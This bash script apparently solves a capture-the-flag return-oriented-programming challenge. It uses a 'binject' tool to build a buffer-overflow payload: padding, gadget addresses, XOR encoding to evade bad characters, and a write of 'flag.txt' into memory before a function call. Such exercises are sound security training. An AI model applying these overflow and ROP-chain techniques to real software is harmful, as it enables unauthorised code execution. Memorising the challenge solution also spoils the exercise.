#!/bin/bash

binject -of bad.bin -s agx.
binject -of prm.bin -s flag.txt
binject -bd bad.bin prm.bin 601038

binject -of ovf.bin -ns 40 A

binject -of reg.bin -a 40069c -if esc.bin -a 601038 -if xvl.bin -if offset/off0.bin

binject -of mem.bin -a 400634

binject -of xor.bin -a 400628
binject -of r15.bin -a 4006a2
binject -of bd1.bin -if xor.bin
binject -of bd2.bin -if r15.bin -if offset/off1.bin -if xor.bin
binject -of bd3.bin -if r15.bin -if offset/off2.bin -if xor.bin
binject -of bd4.bin -if r15.bin -if offset/off3.bin -if xor.bin
binject -of usc.bin -if bd1.bin -if bd2.bin -if bd3.bin -if bd4.bin

binject -of fnc.bin -a 4006a3 -a 601038 -a 400510

binject -of ola.bin -if ovf.bin -if reg.bin -if mem.bin -if usc.bin -if fnc.bin
binject -cb bad.bin -if ovf.bin -if reg.bin -if mem.bin -if usc.bin -if fnc.bin

echo "[*] With flags as: -if ovf.bin -if reg.bin -if mem.bin -if usc.bin -if fnc.bin"
